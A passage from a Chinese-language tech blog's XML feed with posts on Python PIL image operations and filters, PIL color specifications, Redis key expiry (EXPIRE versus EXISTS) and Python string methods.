keyword">return</span> pic_width<span class="token punctuation">,</span> pic_height<span class="token keyword">class</span> <span class="token class-name">MyTranspose</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    FLIP_LEFT_RIGHT <span class="token operator">=</span> <span class="token string">"FLIP_LEFT_RIGHT"</span>    FLIP_TOP_BOTTOM <span class="token operator">=</span> <span class="token string">"FLIP_TOP_BOTTOM"</span>    ROTATE_90 <span class="token operator">=</span> <span class="token string">"ROTATE_90"</span>    ROTATE_180 <span class="token operator">=</span> <span class="token string">"ROTATE_180"</span>    ROTATE_270 <span class="token operator">=</span> <span class="token string">"ROTATE_270"</span>    TRANSPOSE <span class="token operator">=</span> <span class="token string">"TRANSPOSE"</span>    TransposeList <span class="token operator">=</span> <span class="token punctuation">[</span>FLIP_LEFT_RIGHT<span class="token punctuation">,</span>FLIP_TOP_BOTTOM<span class="token punctuation">,</span>ROTATE_90<span class="token punctuation">,</span>ROTATE_180<span class="token punctuation">,</span>ROTATE_270<span class="token punctuation">,</span>TRANSPOSE<span class="token punctuation">]</span>    ImageTransposeList <span class="token operator">=</span> <span class="token punctuation">[</span>Image<span class="token punctuation">.</span>FLIP_LEFT_RIGHT<span class="token punctuation">,</span>Image<span class="token punctuation">.</span>FLIP_TOP_BOTTOM<span class="token punctuation">,</span>Image<span class="token punctuation">.</span>ROTATE_90<span class="token punctuation">,</span>                          Image<span class="token punctuation">.</span>ROTATE_180<span class="token punctuation">,</span>Image<span class="token punctuation">.</span>ROTATE_270<span class="token punctuation">,</span>Image<span class="token punctuation">.</span>TRANSPOSE<span class="token punctuation">]</span><span class="token keyword">class</span> <span class="token class-name">MySplit</span><span class="token punctuation">(</span><span class="token builtin">object</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    R <span class="token operator">=</span> <span class="token string">"R"</span>    G <span class="token operator">=</span> <span class="token string">"G"</span>    B <span class="token operator">=</span> <span class="token string">"B"</span>    SplitList <span class="token operator">=</span> <span class="token punctuation">[</span>R<span class="token punctuation">,</span> G<span class="token punctuation">,</span> B<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">create_transpose</span><span class="token punctuation">(</span>src_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 方向变换</span>    count <span class="token operator">=</span> <span class="token number">0</span>    pic_size <span class="token operator">=</span> get_pic_size<span class="token punctuation">(</span>thumbnail_size<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>MyTranspose<span class="token punctuation">.</span>TransposeList<span class="token punctuation">)</span><span class="token punctuation">,</span> row_count<span class="token punctuation">)</span>    image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGBA"</span><span class="token punctuation">,</span> pic_size<span class="token punctuation">,</span> <span class="token string">"white"</span><span class="token punctuation">)</span>    thumbnail_im <span class="token operator">=</span> create_thumbnail<span class="token punctuation">(</span>src_file<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>MyTranspose<span class="token punctuation">.</span>TransposeList<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        img <span class="token operator">=</span> thumbnail_im<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>        CONTOURimg <span class="token operator">=</span> img<span class="token punctuation">.</span>transpose<span class="token punctuation">(</span>MyTranspose<span class="token punctuation">.</span>ImageTransposeList<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        CONTOURdraw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>CONTOURimg<span class="token punctuation">)</span>        CONTOURdraw<span class="token punctuation">.</span>text<span class="token punctuation">(</span>font_posotion<span class="token punctuation">,</span> MyTranspose<span class="token punctuation">.</span>TransposeList<span class="token punctuation">[</span>count<span class="token punctuation">]</span><span class="token punctuation">,</span> font<span class="token operator">=</span>font<span class="token punctuation">,</span> fill<span class="token operator">=</span>color<span class="token punctuation">)</span>        image<span class="token punctuation">.</span>paste<span class="token punctuation">(</span>CONTOURimg<span class="token punctuation">,</span> get_position<span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">)</span>        count<span class="token operator">+=</span><span class="token number">1</span>    CONTOURimg <span class="token operator">=</span> thumbnail_im<span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>    CONTOURdraw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>CONTOURimg<span class="token punctuation">)</span>    CONTOURdraw<span class="token punctuation">.</span>text<span class="token punctuation">(</span>font_posotion<span class="token punctuation">,</span> <span class="token string">"ORIGINAL PIC"</span><span class="token punctuation">,</span> font<span class="token operator">=</span>font<span class="token punctuation">,</span> fill<span class="token operator">=</span>color<span class="token punctuation">)</span>    image<span class="token punctuation">.</span>paste<span class="token punctuation">(</span>CONTOURimg<span class="token punctuation">,</span> get_position<span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token comment"># image.show()</span>    image<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"transpose.jpg"</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create_blend</span><span class="token punctuation">(</span>src_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 合并</span>    img <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>src_file<span class="token punctuation">)</span>    copy_img <span class="token operator">=</span> img<span class="token punctuation">.</span>transpose<span class="token punctuation">(</span>Image<span class="token punctuation">.</span>FLIP_LEFT_RIGHT<span class="token punctuation">)</span>    res_img <span class="token operator">=</span> Image<span class="token punctuation">.</span>blend<span class="token punctuation">(</span>img<span class="token punctuation">,</span> copy_img<span class="token punctuation">,</span> <span class="token number">0.5</span><span class="token punctuation">)</span>    res_img<span class="token punctuation">.</span>show<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create_composite</span><span class="token punctuation">(</span>src_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 蒙版工具</span>    count <span class="token operator">=</span> <span class="token number">0</span>    mask_name <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token string">"R"</span><span class="token punctuation">,</span><span class="token string">"G"</span><span class="token punctuation">,</span><span class="token string">"B"</span><span class="token punctuation">]</span>    image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGBA"</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token number">1200</span><span class="token punctuation">,</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"white"</span><span class="token punctuation">)</span>    thumbnail_im <span class="token operator">=</span> create_thumbnail<span class="token punctuation">(</span>src_file<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span> i        copy_img <span class="token operator">=</span> thumbnail_im<span class="token punctuation">.</span>transpose<span class="token punctuation">(</span>Image<span class="token punctuation">.</span>FLIP_LEFT_RIGHT<span class="token punctuation">)</span>        res_img <span class="token operator">=</span> Image<span class="token punctuation">.</span>blend<span class="token punctuation">(</span>thumbnail_im<span class="token punctuation">,</span> copy_img<span class="token punctuation">,</span> <span class="token number">0.5</span><span class="token punctuation">)</span>        my_split <span class="token operator">=</span> res_img<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span>        im <span class="token operator">=</span> Image<span class="token punctuation">.</span>composite<span class="token punctuation">(</span>thumbnail_im<span class="token punctuation">,</span> res_img<span class="token punctuation">,</span> my_split<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>        CONTOURdraw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>im<span class="token punctuation">)</span>        CONTOURdraw<span class="token punctuation">.</span>text<span class="token punctuation">(</span>font_posotion<span class="token punctuation">,</span> <span class="token string">"mask: %s"</span> <span class="token operator">%</span> mask_name<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> font<span class="token operator">=</span>font<span class="token punctuation">,</span> fill<span class="token operator">=</span>color<span class="token punctuation">)</span>        image<span class="token punctuation">.</span>paste<span class="token punctuation">(</span>im<span class="token punctuation">,</span> get_position<span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">)</span>        count <span class="token operator">+=</span> <span class="token number">1</span>    image<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"composite.jpg"</span><span class="token punctuation">)</span>    <span class="token comment"># image.show()</span><span class="token keyword">def</span> <span class="token function">create_split</span><span class="token punctuation">(</span>src_file<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token comment"># 图层</span>    count <span class="token operator">=</span> <span class="token number">0</span>    pic_size <span class="token operator">=</span> get_pic_size<span class="token punctuation">(</span>thumbnail_size<span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>MySplit<span class="token punctuation">.</span>SplitList<span class="token punctuation">)</span><span class="token punctuation">,</span> row_count<span class="token punctuation">)</span>    image <span class="token operator">=</span> Image<span class="token punctuation">.</span>new<span class="token punctuation">(</span><span class="token string">"RGBA"</span><span class="token punctuation">,</span> pic_size<span class="token punctuation">,</span> <span class="token string">"white"</span><span class="token punctuation">)</span>    thumbnail_im <span class="token operator">=</span> create_thumbnail<span class="token punctuation">(</span>src_file<span class="token punctuation">)</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token builtin">len</span><span class="token punctuation">(</span>MySplit<span class="token punctuation">.</span>SplitList<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        CONTOURimg <span class="token operator">=</span> thumbnail_im<span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">.</span>copy<span class="token punctuation">(</span><span class="token punctuation">)</span>        CONTOURdraw <span class="token operator">=</span> ImageDraw<span class="token punctuation">.</span>Draw<span class="token punctuation">(</span>CONTOURimg<span class="token punctuation">)</span>        CONTOURdraw<span class="token punctuation">.</span>text<span class="token punctuation">(</span>font_posotion<span class="token punctuation">,</span> MySplit<span class="token punctuation">.</span>SplitList<span class="token punctuation">[</span>count<span class="token punctuation">]</span><span class="token punctuation">,</span> font<span class="token operator">=</span>font<span class="token punctuation">)</span>        image<span class="token punctuation">.</span>paste<span class="token punctuation">(</span>CONTOURimg<span class="token punctuation">,</span> get_position<span class="token punctuation">(</span>count<span class="token punctuation">)</span><span class="token punctuation">)</span>        count <span class="token operator">+=</span> <span class="token number">1</span>    <span class="token comment"># image.show()</span>    image<span class="token punctuation">.</span>save<span class="token punctuation">(</span><span class="token string">"split.jpg"</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>    <span class="token comment"># create_transpose("res.jpg")</span>    <span class="token comment"># create_split("res.jpg")</span>    <span class="token comment"># create_blend("res.jpg")</span>    create_composite<span class="token punctuation">(</span><span class="token string">"res.jpg"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> PIL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-PIL—Color</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-PIL%E2%80%94Color/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-PIL%E2%80%94Color/</url>
      
        <content type="html"><![CDATA[<h4 id="ImageColor"><a href="#ImageColor" class="headerlink" title="ImageColor"></a>ImageColor</h4><h5 id="十六进制"><a href="#十六进制" class="headerlink" title="十六进制"></a>十六进制</h5><ul><li>共六位前两位表示R，中间两位表示G，后两位表示B 如：#ff0000</li></ul><h5 id="RGB"><a href="#RGB" class="headerlink" title="RGB"></a>RGB</h5><ul><li>如：rgb(255, 0, 0)、rgb(100%, 0%, 0%)</li></ul><h5 id="HSL-Hue-Saturation-Ligntness"><a href="#HSL-Hue-Saturation-Ligntness" class="headerlink" title="HSL(Hue-Saturation-Ligntness)"></a>HSL(Hue-Saturation-Ligntness)</h5><ul><li>hsl(hue, saturation%, lightness%)</li><li>hue 为[0, 360], red&#x3D;0, green&#x3D;120, blue&#x3D;240</li><li>saturation 为[0%, 100%] gray&#x3D;0, full&#x3D;100%</li><li>lightness 为[0%, 100%] black&#x3D;0, normal&#x3D;50%, white&#x3D;100%</li><li>如：hsl(0, 100%, 50%)</li></ul><h5 id="Getrgb"><a href="#Getrgb" class="headerlink" title="Getrgb"></a>Getrgb</h5><ul><li>六种方法获取红色tuple值<pre class="line-numbers language-python" data-language="python"><code class="language-python">ImageColors<span class="token punctuation">.</span>getrgb<span class="token punctuation">(</span><span class="token string">"ff0000"</span><span class="token punctuation">)</span><span class="token comment"># (255,0,0)</span>ImageColors<span class="token punctuation">.</span>getrgb<span class="token punctuation">(</span><span class="token string">"rgb(255,0,0)"</span><span class="token punctuation">)</span><span class="token comment"># (255,0,0)</span>ImageColors<span class="token punctuation">.</span>getrgb<span class="token punctuation">(</span><span class="token string">"rgb(100%,0%,0%)"</span><span class="token punctuation">)</span><span class="token comment"># (255,0,0)</span>ImageColors<span class="token punctuation">.</span>getrgb<span class="token punctuation">(</span><span class="token string">"hsl(0,100%,50%)"</span><span class="token punctuation">)</span><span class="token comment"># (255,0,0)</span>ImageColors<span class="token punctuation">.</span>getrgb<span class="token punctuation">(</span><span class="token string">"red"</span><span class="token punctuation">)</span> <span class="token comment"># 不是每个颜色类型的单词都可以这样用，pil中罗列了常用的颜色</span><span class="token comment"># (255,0,0)</span>ImageColors<span class="token punctuation">.</span>getrgb<span class="token punctuation">(</span><span class="token string">"Red"</span><span class="token punctuation">)</span><span class="token comment"># (255,0,0)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ul>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> PIL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-PIL—ImageFilter函数</title>
      <link href="/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-PIL%E2%80%94ImageFilter%E5%87%BD%E6%95%B0/"/>
      <url>/%E5%90%8E%E7%AB%AF%E5%BC%80%E5%8F%91/2021-03-07-Python-PIL%E2%80%94ImageFilter%E5%87%BD%E6%95%B0/</url>
      
        <content type="html"><![CDATA[<p><a href="https://blog.csdn.net/icamera0/article/details/50708888">参考地址</a></p><h4 id="滤镜函数"><a href="#滤镜函数" class="headerlink" title="滤镜函数"></a>滤镜函数</h4><h5 id="先看效果"><a href="#先看效果" class="headerlink" title="先看效果"></a>先看效果</h5><p><img src="https://img-blog.csdnimg.cn/20190729010351783.jpg?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></p><h5 id="Kernel"><a href="#Kernel" class="headerlink" title="Kernel"></a>Kernel</h5><blockquote><p>Kernel(size, kernel, scale&#x3D;None, offset&#x3D;0)</p></blockquote><ul><li>生成给定尺寸的卷积核，变量的size必须为(3, 3) 或(5, 5)。</li><li>kernel与size对应，必须为9或25个整数或浮点数。</li><li>如果设置scale，则卷积核作用于每个像素之后都要除以scale值，默认值为卷积核的权重之和。</li><li>如果设置offset，则将offset值与卷积核相加，然后除以scale</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">im <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>src_file<span class="token punctuation">)</span>Kernel_im <span class="token operator">=</span> im<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>ImageFilter<span class="token punctuation">.</span>Kernel<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="RankFilter"><a href="#RankFilter" class="headerlink" title="RankFilter"></a>RankFilter</h5><blockquote><p>RankFilter(size, rank)</p></blockquote><ul><li>等级滤波器。</li><li>对于输入图像的每个像素点，等级滤波器根据像素值，在(size, size) 的区域中对所有像素点进行排序，然后拷贝对应等级的值存储到输出图像中。</li><li>size，以像素点为中心size * size 的像素点中进行排序。</li><li>rank，size * size 的像素中选择排序第rank位的像素作为新值。</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">im <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>src_file<span class="token punctuation">)</span>im <span class="token operator">=</span> im<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>ImageFilter<span class="token punctuation">.</span>RankFilter<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">,</span><span class="token number">24</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h5 id="MinFilter-MedianFilter-MaxFilter"><a href="#MinFilter-MedianFilter-MaxFilter" class="headerlink" title="MinFilter, MedianFilter,MaxFilter"></a>MinFilter, MedianFilter,MaxFilter</h5><blockquote><p>MinFilter(size)<br>最小滤波器。<br>MedianFilter(size)<br>中值滤波器。<br>MaxFilter(size)<br>最大滤波器。</p></blockquote><ul><li>size，以像素点为中心的(size * size) 区域中选择最小、中值、最大的像素作为新值。</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">im <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>src_file<span class="token punctuation">)</span>im <span class="token operator">=</span> im<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>ImageFilter<span class="token punctuation">.</span>MinFilter<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>im <span class="token operator">=</span> im<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>ImageFilter<span class="token punctuation">.</span>MedianFilterFilter<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>im <span class="token operator">=</span> im<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>ImageFilter<span class="token punctuation">.</span>MaxFilter<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h5 id="ModeFilter"><a href="#ModeFilter" class="headerlink" title="ModeFilter"></a>ModeFilter</h5><blockquote><p>ModeFilter(size)</p></blockquote><ul><li>模式滤波器</li><li>size，以像素点为中心的(size * size)区域中选择出现次数最多的像素最为新值。</li></ul><pre class="line-numbers language-python" data-language="python"><code class="language-python">im <span class="token operator">=</span> Image<span class="token punctuation">.</span><span class="token builtin">open</span><span class="token punctuation">(</span>src_file<span class="token punctuation">)</span>im <span class="token operator">=</span> im<span class="token punctuation">.</span><span class="token builtin">filter</span><span class="token punctuation">(</span>ImageFilter<span class="token punctuation">.</span>ModeFilter<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> 后端开发 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
            <tag> PIL </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Redis-expire比exists更好用</title>
      <link href="/%E4%B8%AD%E9%97%B4%E4%BB%B6/2021-03-07-Redis-expire%E6%AF%94exists%E6%9B%B4%E5%A5%BD%E7%94%A8/"/>
      <url>/%E4%B8%AD%E9%97%B4%E4%BB%B6/2021-03-07-Redis-expire%E6%AF%94exists%E6%9B%B4%E5%A5%BD%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<p><a href="https://www.jianshu.com/p/9352d20fb2e0">参考文章——简书</a></p><h4 id="什么情况下expire比exists更好？"><a href="#什么情况下expire比exists更好？" class="headerlink" title="什么情况下expire比exists更好？"></a>什么情况下expire比exists更好？</h4><h6 id="前提"><a href="#前提" class="headerlink" title="前提"></a>前提</h6><ul><li>redis key过期时间必须设置（特殊需求除外），但是如果DB的值有变动会主动更新到redis，所以不会有数据不同步的情况。</li></ul><h6 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h6><ul><li>每次都需要判断某个key是否存在，然后才能执行相应的操作。</li></ul><h6 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h6><ul><li>最坏情况下，代码在执行exists时key是有效的，后面对key进行操作时，发现在那两行代码执行的中间，key被清掉了。</li><li>条件虽然比较极端，但是在代码里——一切皆有可能。</li></ul><h6 id="解决"><a href="#解决" class="headerlink" title="解决"></a>解决</h6><ul><li>expire代替exists，重置key的过期时间。相当于利用expire给key续命，可以合理的“长生不死”。</li></ul><h1 id="过期相关补充"><a href="#过期相关补充" class="headerlink" title="过期相关补充"></a>过期相关补充</h1><h4 id="设置过期时间"><a href="#设置过期时间" class="headerlink" title="设置过期时间"></a>设置过期时间</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">EXPIRE <span class="token operator">&lt;</span>KEY<span class="token operator">></span> <span class="token operator">&lt;</span>TTL<span class="token operator">></span> <span class="token punctuation">:</span> 将键的生存时间设为 ttl 秒PEXPIRE <span class="token operator">&lt;</span>KEY<span class="token operator">></span> <span class="token operator">&lt;</span>TTL<span class="token operator">></span> <span class="token punctuation">:</span>将键的生存时间设为 ttl 毫秒EXPIREAT <span class="token operator">&lt;</span>KEY<span class="token operator">></span> <span class="token operator">&lt;</span>timestamp<span class="token operator">></span> <span class="token punctuation">:</span>将键的过期时间设为 timestamp 所指定的秒数时间戳PEXPIREAT <span class="token operator">&lt;</span>KEY<span class="token operator">></span> <span class="token operator">&lt;</span>timestamp<span class="token operator">></span><span class="token punctuation">:</span> 将键的过期时间设为 timestamp 所指定的毫秒数时间戳<span class="token punctuation">.</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h4 id="移除过期时间"><a href="#移除过期时间" class="headerlink" title="移除过期时间"></a>移除过期时间</h4><pre class="line-numbers language-python" data-language="python"><code class="language-python">persist key<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="redis值和过期时间的存储"><a href="#redis值和过期时间的存储" class="headerlink" title="redis值和过期时间的存储"></a>redis值和过期时间的存储</h4><p><img src="https://imgconvert.csdnimg.cn/aHR0cHM6Ly91cGxvYWQtaW1hZ2VzLmppYW5zaHUuaW8vdXBsb2FkX2ltYWdlcy83MzYxMzgzLTcwMDYyYTM2ZDQxOWZjMTcucG5n?x-oss-process=image/format,png" alt="在这里插入图片描述"></p><h4 id="删除book键的过期时间后的存储结构"><a href="#删除book键的过期时间后的存储结构" class="headerlink" title="删除book键的过期时间后的存储结构"></a>删除book键的过期时间后的存储结构</h4><ul><li>book键的过期时间没有了<br><img src="https://img-blog.csdnimg.cn/20190823213116792.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L2xpeXV4aW5nNjYzOTgwMQ==,size_16,color_FFFFFF,t_70" alt="在这里插入图片描述"></li></ul>]]></content>
      
      
      <categories>
          
          <category> 中间件 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Redis </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Python-基础知识整理</title>
      <link href="/uncatesgorized/2021-03-07-Python-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/"/>
      <url>/uncatesgorized/2021-03-07-Python-%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86%E6%95%B4%E7%90%86/</url>
      
        <content type="html"><![CDATA[<h4 id="数据类型"><a href="#数据类型" class="headerlink" title="数据类型"></a>数据类型</h4><p>基本数据类型：int,float,str,list,dict,tuple,set,bool<br>数值类型：int,float,bool<br>序列类型：str,list,tuple<br>散列类型：set,dict</p><p>字节类型 a&#x3D;bytes(‘123’)&#x2F;a &#x3D; b’123’<br>字节数组 bytearray(‘123’)</p><p>可变序列：list,set,dict<br>不可变序列：str,tuple</p><h4 id="数据类型方法"><a href="#数据类型方法" class="headerlink" title="数据类型方法"></a>数据类型方法</h4><h5 id="字符串方法"><a href="#字符串方法" class="headerlink" title="字符串方法"></a>字符串方法</h5><ol><li>增<pre class="line-numbers language-python" data-language="python"><code class="language-python">strs <span class="token operator">=</span> str1 <span class="token operator">+</span> str2 <span class="token operator">+</span> str3strs <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">[</span>str1<span class="token punctuation">,</span> str2<span class="token punctuation">,</span> str3<span class="token punctuation">]</span><span class="token punctuation">)</span>strs <span class="token operator">=</span> <span class="token string">"%s%s%s"</span> <span class="token operator">%</span> <span class="token punctuation">(</span>str1<span class="token punctuation">,</span> str2<span class="token punctuation">,</span> str3<span class="token punctuation">)</span>strs <span class="token operator">=</span> <span class="token string">"&#123;&#125;&#123;&#125;&#123;&#125;"</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>str1<span class="token punctuation">,</span> str2<span class="token punctuation">,</span> str3<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre></li><li>删<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># m准备替换的内容，n替换的内容，x替换的个数</span>strs <span class="token operator">=</span> x<span class="token punctuation">.</span>replace<span class="token punctuation">(</span>m<span class="token punctuation">,</span> n<span class="token punctuation">,</span> x<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre></li><li>改<pre class="line-numbers language-python" data-language="python"><code class="language-python">x<span class="token punctuation">.</span>upper<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># x转化为大写</span>x<span class="token punctuation">.</span>lower<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># x转化为小写</span>x<span class="token punctuation">.</span>strip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 去x左右空白</span>x<span class="token punctuation">.</span>lstrip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 去左空白</span>x<span class="token punctuation">.</span>rstrip<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 去右空白</span>x<span class="token punctuation">.</span>title<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># x标题化</span>x<span class="token punctuation">.</span>capitalize<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token comment"># 第一个字母大写</span>x<span class="token punctuation">.</span>split<span class="token punctuation">(</span>m<span class="token punctuation">,</span> x<span class="token punctuation">)</span> <span class="token comment"># 以m为界分割，分割x次</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li><li>查<pre class="line-numbers language-python" data-language="python"><code class="language-python">x<span class="token punctuation">.</span>index<span class="token punctuation">(</span>m<span class="token punctuation">)</span> <span class="token 